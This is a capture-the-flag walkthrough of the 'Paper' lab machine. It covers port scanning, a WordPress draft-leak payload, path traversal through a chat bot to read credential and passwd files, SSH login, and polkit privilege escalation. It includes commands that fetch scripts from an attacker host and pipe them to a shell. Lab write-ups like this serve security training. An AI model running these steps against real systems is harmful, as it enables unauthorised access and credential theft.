# Box: Paper

> Damiano Gubiani | 27/11/2025

export box ip

```bash
export IP='10.10.11.143'
```

# Enumerating

running nmap scan for open ports

command:

```bash
sudo nmap -sS -sC -oN nmap/scan_all -p - -vv -T4 $IP
```

output:

```bash
# Nmap 7.95 scan initiated Thu Nov 27 05:48:41 2025 as: /usr/lib/nmap/nmap -sS -sC -oN nmap/scan_all -p - -vv -T4 10.10.11.143
Increasing send delay for 10.10.11.143 from 0 to 5 due to 1258 out of 3144 dropped probes since last increase.
Increasing send delay for 10.10.11.143 from 5 to 10 due to 11 out of 13 dropped probes since last increase.
Nmap scan report for 10.10.11.143
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2025-11-27 05:48:42 EST for 746s
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
| ssh-hostkey: 
|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDcZzzauRoUMdyj6UcbrSejflBMRBeAdjYb2Fkpkn55uduA3qShJ5SP33uotPwllc3wESbYzlB9bGJVjeGA2l+G99r24cqvAsqBl0bLStal3RiXtjI/ws1E3bHW1+U35bzlInU7AVC9HUW6IbAq+VNlbXLrzBCbIO+l3281i3Q4Y2pzpHm5OlM2mZQ8EGMrWxD4dPFFK0D4jCAKUMMcoro3Z/U7Wpdy+xmDfui3iu9UqAxlu4XcdYJr7Iijfkl62jTNFiltbym1AxcIpgyS2QX1xjFlXId7UrJOJo3c7a0F+B3XaBK5iQjpUfPmh7RLlt6CZklzBZ8wsmHakWpysfXN
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE/Xwcq0Gc4YEeRtN3QLduvk/5lezmamLm9PNgrhWDyNfPwAXpHiu7H9urKOhtw9SghxtMM2vMIQAUh/RFYgrxg=
|   256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdmmhk1vKOrAmcXMPh0XRA5zbzUHt1JBbbWwQpI4pEX
80/tcp  open  http    syn-ack ttl 63
|_http-title: HTTP Server Test Page powered by CentOS
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28
443/tcp open  https   syn-ack ttl 63
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/emailAddress=root@localhost.localdomain
| Subject Alternative Name: DNS:localhost.localdomain
| Issuer: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US/organizationalUnitName=ca-3899279223185377061/emailAddress=root@localhost.localdomain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-03T08:52:34
| Not valid after:  2022-07-08T10:32:34
| MD5:   579a:92bd:803c:ac47:d49c:5add:e44e:4f84
| SHA-1: 61a2:301f:9e5c:2603:a643:00b5:e5da:5fd5:c175:f3a9
|_ssl-date: TLS randomness does not represent time
|_http-title: HTTP Server Test Page powered by CentOS
| tls-alpn: 
|_  http/1.1
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28

Read data files from: /usr/share/nmap
# Nmap done at Thu Nov 27 06:01:08 2025 -- 1 IP address (1 host up) scanned in 746.93 seconds

```

we have the _SSH_ port open as well as _HTTP and HTTPS_ protocol 

lets check the webapp
# Webapp

i started burpsuite to check for the response of the server since there was nothing on interesting with manual enumeration

in fact i found something in the response header of the server

![](screen/Pasted%20image%2020251127161428.png)

so we add the domain to our hosts file

```bash
sudo echo '10.10.11.143 office.paper' >> /etc/hosts
```

the domain bring us to a blog post website

![](screen/Pasted%20image%2020251127161552.png)

checking the webpage i saw on the footer that there was a login page that bring us to a wordpress login

i started enumerating wordpress with _wpscan_

command

```bash
wpscan -e vp --url 'http://office.paper/wp-log-in.php'
```

output:

```bash
[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
 | Found By: Most Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |  - http://office.paper/wp-includes/css/dashicons.min.css?ver=5.2.3
 | Confirmed By:
 |  Common Wp Includes Query Parameter In Homepage (Passive Detection)
 |   - http://office.paper/wp-includes/css/buttons.min.css?ver=5.2.3
 |  Query Parameter In Install Page (Aggressive Detection)
 |   - http://office.paper/wp-includes/css/dashicons.min.css?ver=5.2.3
 |   - http://office.paper/wp-includes/css/buttons.min.css?ver=5.2.3
 |   - http://office.paper/wp-admin/css/forms.min.css?ver=5.2.3
 |   - http://office.paper/wp-admin/css/l10n.min.css?ver=5.2.3

```

we can see that this version of wordpress is outdated , in fact checking online for public exploit we found something

> https://www.exploit-db.com/exploits/47690

basicly we can leak secret contact with this payload

```
/?static=1
```

lets try it on the website

![](screen/Pasted%20image%2020251127162329.png)

lets add the found domain and check what the website is about

```bash
sudo echo '10.10.11.143 chat.office.paper' >> /etc/hosts
```

# Foothold

we are greated with a register page , i created a test accound and loged in.

we have a general thread with an interesting bot that allow us to read and list files

![](screen/Pasted%20image%2020251127162750.png)

i started a private chat with the bot to try and break out if the confined listing of the sale directory

i found out that if we try to list a relative path like **list ..** the bot will list a different directory

![](screen/Pasted%20image%2020251127163433.png)

i tryed and check for the .ssh directory but there was nothing there , so i listed the hubot directory

![](screen/Pasted%20image%2020251127163538.png)

checking the start_bot file to understand if theres some plain text password

![](screen/Pasted%20image%2020251127163702.png)

seems it calls an enviroment file , maybe the credentials are there

in fact listing the file i got plaintext credentials

![](screen/Pasted%20image%2020251127163807.png)

NICE ! , we got some credentials , lets list the /etc/passwd to see the user on the machine

![](screen/Pasted%20image%2020251127163906.png)

i loged in as dwight user with the ssh

![](screen/Pasted%20image%2020251127164023.png)

# Privilage Escaletion

first thing i did was uploading linpeas for a full enumeration of the target machine

i started and http listener and than i upload it on the target machine

```bash
# attacker machine
python3 -m http.server 80

# box machine
curl http://10.10.14.7/linpeas.sh | sh
```

the system is vulnerable to polkit exploitation

![](screen/Pasted%20image%2020251127164442.png)

i used this PoC from github to exploit this vulnerability

> https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/blob/main/poc.sh

i upload it on the machine with the same method

```bash
# attacker machine
python3 -m http.server 80

# box machine
wget http://10.10.14.7/poc.sh
```

its a time based script so if it doesnt work we need to run it multiple timesu ntil it works

![](screen/Pasted%20image%2020251127164820.png)

in fact after a few tries we are finaly root

![](screen/Pasted%20image%2020251127164918.png)
